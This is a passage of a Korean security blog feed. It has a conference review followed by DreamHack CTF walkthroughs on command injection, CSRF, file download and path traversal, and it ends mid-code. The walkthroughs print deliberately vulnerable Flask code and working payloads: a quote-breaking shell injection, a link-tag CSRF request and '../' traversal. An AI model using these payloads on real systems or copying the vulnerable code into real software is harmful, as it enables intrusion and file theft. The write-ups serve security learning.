후기"/><published>2021-04-06T06:24:00+00:00</published><updated>2021-04-06T06:24:00+00:00</updated><id>https://dalnaracrater.github.io/blog/2021/SDS-Cyber_Security-Conference</id><content type="html" xml:base="https://dalnaracrater.github.io/blog/2021/SDS-Cyber_Security-Conference/"><![CDATA[<h2 id="간단한-후기">간단한 후기</h2> <p>Samsung SDS에서 Cyber Security Conference 2021을 개최하였다. 컨퍼런스에서는 최근 보안 동향과 기술들을 다루고 있었다. 특히 COVID-19사태를 맞이한 지금, SDS가 어떻게 보안 솔루션을 제공하고 있는지에 대한 내용들이 주를 이루었다. 산업에서 현재 다루고 있는 보안 동향에 대해 알 수 있는 좋은 기회였다. 다만 컨퍼런스가 쉬는 시간 없이 빡빡하게 진행되는 점이 아쉬웠다.</p> <h3 id="zero-trust-network">Zero Trust Network</h3> <p>일반적으로 네트워크의 경계부분만 관리하면 된다는 전통적인 생각이 만연하다고 한다. 하지만 더 이상 이러한 생각은 통하지 않기 때문에 <strong>Zero trust 보안</strong>에 대해서 고려해야 한다.<br/> Zero trust는 사용자부터, 디바이스, 네트워크 등 보안이 고려될 수 있는 모든 요소를 고려함으로써 아무것도 신뢰하지 않는 (Zero trust) 보안 접근 방식을 말한다.</p> <p>원격 근무 환경에서의 계정 보안 강화를 위해 완충지대를 두고 접근 제어를 해야하기 때문에 로깅이 필요하다.</p> <ul> <li>이상 감지 엔진 (유저 행위, 단말 정보, 인증 통신)</li> </ul> <p>보통 원격접속, SSL VPN 등을 통해 원격 근무 환경을 조성한다. 그렇다면 업무 지연은 없을까?<br/> 방화벽정책을 적용하는 등에 시간이 소요되면 <strong>업무의 연속성</strong>을 침해하게 된다.</p> <ul> <li>신원 확인 w/ MFA</li> <li>디바이스 신뢰성 확인 <ul> <li>악성코드 확인 / 차등화된 접근 레벨 설정</li> </ul> </li> <li>최소 접근 권한 관리</li> </ul> <p>금감원, 재택근무 가이드</p> <ul> <li>외부 단말기 보안</li> <li>인증 및 통신 회선: MFA</li> <li>내부망 접근 통제</li> </ul> <h3 id="endpoint-detection-and-response-edr">Endpoint Detection and Response (EDR)</h3> <p>pre, post 시점에 대해서는 사전에 잘 예방하고, 사후 보완을 하는 것은 큰 문제가 없다고 한다. 그러나 peri (현재)는 다르며, 매우 중요하다고 하였다 (very critical).</p> <p>automatic response happens</p> <ul> <li>automation (자동화)</li> <li>autonomy (자율성)</li> <li>Correlation (연관성)</li> <li>End-to-End Integreted Processes</li> <li>One Platform</li> <li>SOC Empowerment</li> </ul> <h3 id="딥페이크-탐지">딥페이크 탐지</h3> <p>딥페이크를 탐지하기 위해 생리적 특징, 이미지, 주파수 정보를 이용한다고 한다. SDS의 경우에는 주파수 기반의 탐지 기법을 사용하고 있으며 99.99%이상의 성능을 보인다고 하였다.<br/> 또한 어느 한 로이터 기자의 인터뷰에 따르면 실제로 무엇을 분석하려고 하는지 알기만 하면 딥페이크가 적용된 영상을 탐지하는 것은 쉬울 것이라고 하였다.</p> <h3 id="기타-주제들">기타 주제들</h3> <ul> <li>On premis에서 Cloud로의 변화</li> <li>가상환경을 이용한 버그바운티</li> <li>동형암호</li> </ul> <h2 id="q--a">Q &amp; A</h2> <p>Q. 그렇다면 IT보안 체계가 여러개 필요하다고 했는데 그렇다면 디지털 관련 속도나 리소스가 상당히 들어갈 가능성 있는데, 이 부분의 효율성은 어떻게 살려야 할까요?<br/> A. 가능한 유사기능은 통합을 고려하는 것이 좋을 것 같습니다. 그리고, 최근에 SOAR 등과 같이 복합한 보안체계에 대한 통합 및 자동화를 지원하는 솔루션들도 나오고 있어서 도입을 고려하시는 것도 방안일 것 같습니다.</p> <p>Q. 정보유출 관점에서 스마트폰 등 외부기기를 통한 화면촬영에 대한 보안책도 있는지요?<br/> A. 물리적인 화면을 보호하기 위해서는 특정장소에서 휴대기기의 기능을 통제하는 MDM을 도입하거나 물리적 통제(반입금지 등)이 수단이 될 것 같습니다.)</p> <p>Q. 최근 카카오웍크도 클라우드기반의 외부 플랫폼도 활용하고 있는데요, 외부 연계 플랫폼으로 들어오는 관리 사례가 있을까요?<br/> A. 네, 요새 Cloud SaaS에 대한 연계가 필수적인데요, Workday 등 다수 Cloud SaaS 앱과도 연계가 가능합니다. (Saml, OIDC 등 활용)</p> <p>Q. 솔라윈즈와 같은 사고를 예방하는 방법이 제로트러스트란 뜻인지요? 제로트러스트란 무엇인지 제로트러스트 구축을 위해 기업이 고민해야 할 사항은 무엇인지 설명 부탁드립니다.<br/> A. 제로트러스트라는 것은 그 누구도 믿지 말라는 뜻입니다. 이를 위해서는 접근통제에 대한 강화와, 접근된 이후 감사로그에 대한 분석/모니터링을 통한 유기적인 사후대응이 포함되어야 합니다. 또한 이러한 부분이 사용성에 지장으로 다가가지 않도록 편의성에 대한 부분도 고려되야 합니다.</p> <p>Q. 일반적으로 사전 탐지가 어려운것으로 알고 있습니다. 사전 탐지를 위한 요건들은 어떤것들이 있는지요?<br/> A. 사전탐지에 대한 부분은 일단은 공격에 대한 축적된 지식을 기반으로 한 시나리오로 선제대응을 해야 하며, 이후에 지속적인 지식화 작업으로 사전탐지 대응력을 높여가야 합니다.</p> <p>Q. 차세대방화벽에서 암호화된 트래픽에 대한 탐지/차단은 어떤식으로 가능한지 궁금합니다.<br/> A. 암호화트래픽(SSL)에 대한 복호화 처리 기능이 있어서 방화벽에서 이를 복호화하여 보안처리 후, 다시 암호화 처리하여 전송을 하여 줍니다.</p> <h2 id="마무리">마무리</h2> <p>국내 보안 컨퍼런스는 이번이 두번째인데 비록 회사의 보안 제품을 홍보하는 내용이 마지막에 많이 나와 아쉬웠지만 최근 보안 동향도 알고, 산업에서 중요시 하는 보안 요소들을 알 수 있어 좋았다.</p>]]></content><author><name></name></author><category term="Conference"/><category term="Security"/><summary type="html"><![CDATA[간단한 후기]]></summary></entry><entry><title type="html">(DreamHack) command-injection-1</title><link href="https://dalnaracrater.github.io/blog/2021/(DreamHack)-command-injection-1/" rel="alternate" type="text/html" title="(DreamHack) command-injection-1"/><published>2021-03-30T09:24:00+00:00</published><updated>2021-03-30T09:24:00+00:00</updated><id>https://dalnaracrater.github.io/blog/2021/(DreamHack)-command-injection-1</id><content type="html" xml:base="https://dalnaracrater.github.io/blog/2021/(DreamHack)-command-injection-1/"><![CDATA[<p>command injection은 말 그대로 명령어를 주입하여 해당 명령어를 실행시키는 취약점이다.</p> <p>ping 페이지에는 다음과 같이 host 주소를 입력하는 폼이 있으며, 소스코드에는 host에 3번 icmp 패킷을 전송하도록 되어있다.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@APP.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/ping</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">ping</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">:</span>
        <span class="n">host</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">host</span><span class="sh">'</span><span class="p">)</span>
        <span class="n">cmd</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">'</span><span class="s">ping -c 3 </span><span class="sh">"</span><span class="si">{</span><span class="n">host</span><span class="si">}</span><span class="sh">"'</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">output</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="nf">check_output</span><span class="p">([</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">-c</span><span class="sh">'</span><span class="p">,</span> <span class="n">cmd</span><span class="p">],</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
            <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">ping_result.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">output</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">))</span>
        <span class="k">except</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">TimeoutExpired</span><span class="p">:</span>
            <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">ping_result.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="sh">'</span><span class="s">Timeout !</span><span class="sh">'</span><span class="p">)</span>
        <span class="k">except</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">CalledProcessError</span><span class="p">:</span>
            <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">ping_result.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="sa">f</span><span class="sh">'</span><span class="s">an error occurred while executing the command. -&gt; </span><span class="si">{</span><span class="n">cmd</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>

    <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">ping.html</span><span class="sh">'</span><span class="p">)</span>
</code></pre></div></div> <p>따라서 입력 폼에 명령어를 삽입하면 될 것 같다는 생각이 들었다. 하지만 입력 폼은 알파벳 대소문자, 숫자를 5 ~ 20번까지만 사용할 수 있도록 되어있다.</p> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">class=</span><span class="s">"form-control"</span> <span class="na">id=</span><span class="s">"Host"</span> <span class="na">placeholder=</span><span class="s">"8.8.8.8"</span> <span class="na">name=</span><span class="s">"host"</span> <span class="na">pattern=</span><span class="s">"[A-Za-z0-9.]{5,20}"</span> <span class="na">required</span><span class="nt">&gt;</span>
</code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">127.0.0.1; cat flag.py</code>을 입력하여 보았다.<br/> 다음과 같이 에러 메시지가 출력된다. 자세히 살펴보니 명령어에 큰 따옴표가 삽입되어 있다.</p> <p><img src="https://user-images.githubusercontent.com/24788751/112983371-93766b00-9198-11eb-8617-18bfa7932aed.png" alt="image"/></p> <p>이를 처리하기 위해 중간에 큰 따옴표를 삽입하였다.<br/> <code class="language-plaintext highlighter-rouge">127.0.0.1"; cat "flag.py</code>를 입력하였더니 정상적으로? 명령어가 삽입되었으며, 플래그 값을 얻을 수 있었다.</p> <p><img src="https://user-images.githubusercontent.com/24788751/112982615-a3417f80-9197-11eb-9e4e-146df2ac6bb1.png" alt="image"/></p>]]></content><author><name></name></author><category term="Security"/><category term="CTF"/><summary type="html"><![CDATA[command injection은 말 그대로 명령어를 주입하여 해당 명령어를 실행시키는 취약점이다.]]></summary></entry><entry><title type="html">(DreamHack) csrf-1</title><link href="https://dalnaracrater.github.io/blog/2021/(DreamHack)-csrf-1/" rel="alternate" type="text/html" title="(DreamHack) csrf-1"/><published>2021-03-30T09:24:00+00:00</published><updated>2021-03-30T09:24:00+00:00</updated><id>https://dalnaracrater.github.io/blog/2021/(DreamHack)-csrf-1</id><content type="html" xml:base="https://dalnaracrater.github.io/blog/2021/(DreamHack)-csrf-1/"><![CDATA[<p>CSRF(Cross Script Request Forgery)는 클라이언트의 권한을 이용해서 의도하지 않은 요청을 하는 취약점이다.</p> <p><img src="https://user-images.githubusercontent.com/24788751/112967909-b7c94c00-9186-11eb-9328-f4d1ad066342.png" alt="image"/></p> <p>flag라는 페이지에 위와 같이 입력을 할 수 있는 폼이 있었다. FLAG를 얻기 위해서는 ‘/admin/notice_flag’에서 host가 127.0.0.1, userid가 admin이어야 함을 알 수 있다.<br/> 그렇게 되면 memo_text가 전역변수로 사용되어 있기 때문에 해당 변수에 FLAG 값을 저장한 뒤 memo 페이지를 호출하면 memo_text 값이 메모 페이지에 출력된다.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/flag</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">flag</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">flag.html</span><span class="sh">'</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">:</span>
        <span class="n">csrf</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">csrf</span><span class="sh">'</span><span class="p">,</span> <span class="sh">''</span><span class="p">)</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="nf">read_url</span><span class="p">(</span><span class="n">csrf</span><span class="p">):</span>
            <span class="k">return</span> <span class="sh">'</span><span class="s">&lt;script&gt;alert(</span><span class="sh">"</span><span class="s">wrong??</span><span class="sh">"</span><span class="s">);history.go(-1);&lt;/script&gt;</span><span class="sh">'</span>

        <span class="k">return</span> <span class="sh">'</span><span class="s">&lt;script&gt;alert(</span><span class="sh">"</span><span class="s">good</span><span class="sh">"</span><span class="s">);history.go(-1);&lt;/script&gt;</span><span class="sh">'</span>

<span class="k">def</span> <span class="nf">read_url</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">cookie</span><span class="o">=</span><span class="p">{</span><span class="sh">'</span><span class="s">name</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">name</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">value</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">value</span><span class="sh">'</span><span class="p">}):</span>
    <span class="n">cookie</span><span class="p">.</span><span class="nf">update</span><span class="p">({</span><span class="sh">'</span><span class="s">domain</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">127.0.0.1</span><span class="sh">'</span><span class="p">})</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">options</span> <span class="o">=</span> <span class="n">webdriver</span><span class="p">.</span><span class="nc">ChromeOptions</span><span class="p">()</span>
        <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="p">[</span><span class="sh">'</span><span class="s">headless</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">window-size=1920x1080</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">disable-gpu</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">no-sandbox</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">disable-dev-shm-usage</span><span class="sh">'</span><span class="p">]:</span>
            <span class="n">options</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="n">_</span><span class="p">)</span>
        <span class="n">driver</span> <span class="o">=</span> <span class="n">webdriver</span><span class="p">.</span><span class="nc">Chrome</span><span class="p">(</span><span class="sh">'</span><span class="s">/chromedriver</span><span class="sh">'</span><span class="p">,</span> <span class="n">options</span><span class="o">=</span><span class="n">options</span><span class="p">)</span>
        <span class="n">driver</span><span class="p">.</span><span class="nf">implicitly_wait</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
        <span class="n">driver</span><span class="p">.</span><span class="nf">set_page_load_timeout</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
        <span class="n">driver</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">http://127.0.0.1:8000/</span><span class="sh">'</span><span class="p">)</span>
        <span class="n">driver</span><span class="p">.</span><span class="nf">add_cookie</span><span class="p">(</span><span class="n">cookie</span><span class="p">)</span>
        <span class="n">driver</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">http://127.0.0.1:8000/csrf?csrf=</span><span class="si">{</span><span class="n">urllib</span><span class="p">.</span><span class="n">parse</span><span class="p">.</span><span class="nf">quote</span><span class="p">(</span><span class="n">url</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="n">driver</span><span class="p">.</span><span class="nf">quit</span><span class="p">()</span>
        <span class="k">return</span> <span class="bp">False</span>
    <span class="n">driver</span><span class="p">.</span><span class="nf">quit</span><span class="p">()</span>
    <span class="k">return</span> <span class="bp">True</span>
</code></pre></div></div> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/admin/notice_flag</span><span class="sh">'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">admin_notice_flag</span><span class="p">():</span>
    <span class="k">global</span> <span class="n">memo_text</span>
    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">remote_addr</span> <span class="o">!=</span> <span class="sh">'</span><span class="s">127.0.0.1</span><span class="sh">'</span><span class="p">:</span>
        <span class="k">return</span> <span class="sh">'</span><span class="s">Access Denied</span><span class="sh">'</span>
    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">userid</span><span class="sh">'</span><span class="p">,</span> <span class="sh">''</span><span class="p">)</span> <span class="o">!=</span> <span class="sh">'</span><span class="s">admin</span><span class="sh">'</span><span class="p">:</span>
        <span class="k">return</span> <span class="sh">'</span><span class="s">Your not admin</span><span class="sh">'</span>
    <span class="n">memo_text</span> <span class="o">+=</span> <span class="sa">f</span><span class="sh">'</span><span class="s">[Notice] flag is </span><span class="si">{</span><span class="n">FLAG</span><span class="si">}</span><span class="se">\n</span><span class="sh">'</span>
    <span class="k">return</span> <span class="sh">'</span><span class="s">Ok</span><span class="sh">'</span>

<span class="n">memo_text</span> <span class="o">=</span> <span class="sh">''</span>
<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/memo</span><span class="sh">'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">memo</span><span class="p">():</span>
    <span class="k">global</span> <span class="n">memo_text</span>
    <span class="n">text</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">memo</span><span class="sh">'</span><span class="p">,</span> <span class="bp">None</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">text</span><span class="p">:</span>
        <span class="n">memo_text</span> <span class="o">+=</span> <span class="n">text</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="s">&lt;</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">&amp;lt;</span><span class="sh">'</span><span class="p">)</span> <span class="o">+</span> <span class="sh">'</span><span class="se">\n</span><span class="sh">'</span>
    <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">memo.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">memo</span><span class="o">=</span><span class="n">memo_text</span><span class="p">)</span>
</code></pre></div></div> <p>주어진 텍스트 박스에 아래 스크립트를 입력하였다.</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">link</span> <span class="nx">rel</span><span class="o">=</span><span class="dl">"</span><span class="s2">stylesheet</span><span class="dl">"</span> <span class="nx">href</span><span class="o">=</span><span class="dl">"</span><span class="s2">/admin/notice_flag?userid=admin</span><span class="dl">"</span><span class="o">&gt;</span>
</code></pre></div></div> <p>memo 페이지를 조회해보니 다음과 같으 플래그 값을 얻을 수 있었다. <img src="https://user-images.githubusercontent.com/24788751/112967836-a5e7a900-9186-11eb-9630-f79e843cfe8d.png" alt="image"/></p>]]></content><author><name></name></author><category term="Security"/><category term="CTF"/><summary type="html"><![CDATA[CSRF(Cross Script Request Forgery)는 클라이언트의 권한을 이용해서 의도하지 않은 요청을 하는 취약점이다.]]></summary></entry><entry><title type="html">(DreamHack) file-download-1</title><link href="https://dalnaracrater.github.io/blog/2021/(DreamHack)-file-download-1/" rel="alternate" type="text/html" title="(DreamHack) file-download-1"/><published>2021-03-23T09:24:00+00:00</published><updated>2021-03-23T09:24:00+00:00</updated><id>https://dalnaracrater.github.io/blog/2021/(DreamHack)-file-download-1</id><content type="html" xml:base="https://dalnaracrater.github.io/blog/2021/(DreamHack)-file-download-1/"><![CDATA[<p>파일 다운로드 취약점은 ../과 같이 url의 경로를 조작하여 파일을 읽거나 다운로드 하는 취약점이다.</p> <p>주어진 소스코드를 살펴보면, /upload에서 POST 메소드를 통해 filename, content를 사용자 입력으로 받아 filename으로 된 파일을 읽고 content를 쓰는 작업을 한다. 그러나 이때 filename 속에 ‘..’문자가 있는지 확인하기 때문에 filename을 통해 취약점을 익스플로잇하려고 할 경우 다음과 같은 화면이 출력된다.</p> <p><img src="https://user-images.githubusercontent.com/24788751/112131875-5c8add00-8c0d-11eb-9387-e557305bd1ea.png" alt="image"/></p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@APP.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/upload</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">upload_memo</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">:</span>
        <span class="n">filename</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">filename</span><span class="sh">'</span><span class="p">)</span>
        <span class="n">content</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">content</span><span class="sh">'</span><span class="p">).</span><span class="nf">encode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">)</span>

        <span class="k">if</span> <span class="n">filename</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sh">'</span><span class="s">..</span><span class="sh">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
            <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">upload_result.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="sh">'</span><span class="s">bad characters,,</span><span class="sh">'</span><span class="p">)</span>

        <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">UPLOAD_DIR</span><span class="si">}</span><span class="s">/</span><span class="si">{</span><span class="n">filename</span><span class="si">}</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">wb</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
            <span class="n">f</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>

        <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">)</span>

    <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">upload.html</span><span class="sh">'</span><span class="p">)</span>
</code></pre></div></div> <p>/read에서는 별다른 사용자 입력 없이 name의 값을 filename으로 읽어들여 해당 파일의 데이터를 읽어들이는 것을 확인할 수 있다.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">UPLOAD_DIR</span> <span class="o">=</span> <span class="sh">'</span><span class="s">uploads</span><span class="sh">'</span>

<span class="nd">@APP.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/read</span><span class="sh">'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">read_memo</span><span class="p">():</span>
    <span class="n">error</span> <span class="o">=</span> <span class="bp">False</span>
    <span class="n">data</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">''</span>

    <span class="n">filename</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">name</span><span class="sh">'</span><span class="p">,</span> <span class="sh">''</span><span class="p">)</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">UPLOAD_DIR</span><span class="si">}</span><span class="s">/</span><span class="si">{</span><span class="n">filename</span><span class="si">}</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">rb</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
            <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span>
    <span class="nf">except </span><span class="p">(</span><span class="nb">IsADirectoryError</span><span class="p">,</span> <span class="nb">FileNotFoundError</span><span class="p">):</span>
        <span class="n">error</span> <span class="o">=</span> <span class="bp">True</span>


    <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">read.html</span><span class="sh">'</span><span class="p">,</span>
                           <span class="n">filename</span><span class="o">=</span><span class="n">filename</span><span class="p">,</span>
                           <span class="n">content</span><span class="o">=</span><span class="n">data</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">),</span>
                           <span class="n">error</span><span class="o">=</span><span class="n">error</span><span class="p">)</span>
</code></pre></div></div> <p>다음과 같이 host:port/read?name=flag.py 파라미터를 추가하면 flag.py 파일이 존재하지 않는다고 나온다.</p> <p><img src="https://user-images.githubusercontent.com/24788751/112131799-44b35900-8c0d-11eb-9ebd-ef69958ff57a.png" alt="image"/></p> <p>(만약 /upload에서 리다이렉트 된 페이지에서 filename을 flag.py, content를 Hello라고 입력한 후 업로드 할 경우 host:port/read?name=flag.py에서 Hello가 출력된다.)</p> <p>다시 위에 코드를 살펴보면 파일의 주소가 {UPLOAD_DIR}/{filename}으로 설정된 것을 볼 수 있으며, UPLOAD_DIR은 uploads이기 때문에 이를 벗어나 주어야 한다.<br/> 따라서 host:port/read?name=../flag.py를 입력하면 flag 값을 얻을 수 있다.</p> <p><img src="https://user-images.githubusercontent.com/24788751/112131785-3feea500-8c0d-11eb-96b1-751191e4e218.png" alt="image"/></p>]]></content><author><name></name></author><category term="Security"/><category term="CTF"/><summary type="html"><![CDATA[파일 다운로드 취약점은 ../과 같이 url의 경로를 조작하여 파일을 읽거나 다운로드 하는 취약점이다.]]></summary></entry><entry><title type="html">(DreamHack) pathtraversal</title><link href="https://dalnaracrater.github.io/blog/2021/(DreamHack)-pathtraversal/" rel="alternate" type="text/html" title="(DreamHack) pathtraversal"/><published>2021-03-23T09:24:00+00:00</published><updated>2021-03-23T09:24:00+00:00</updated><id>https://dalnaracrater.github.io/blog/2021/(DreamHack)-pathtraversal</id><content type="html" xml:base="https://dalnaracrater.github.io/blog/2021/(DreamHack)-pathtraversal/"><![CDATA[<p>Path traversal은 URL의 경로를 임의로 조작하여 의도하지 않는 api 실행 및 파일 접근을 가능하게 하는 취약점입니다. (cf. directory listing)</p> <p>주어진 소스코드를 살펴보면 사용자 입력으로 userid를 받아 {API_HOST}/api/user/{userid}의 경로로 POST 요청을 보내는 것을 알 수 있습니다.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/get_info</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">get_info</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">get_info.html</span><span class="sh">'</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">:</span>
        <span class="n">userid</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">userid</span><span class="sh">'</span><span class="p">,</span> <span class="sh">''</span><span class="p">)</span>
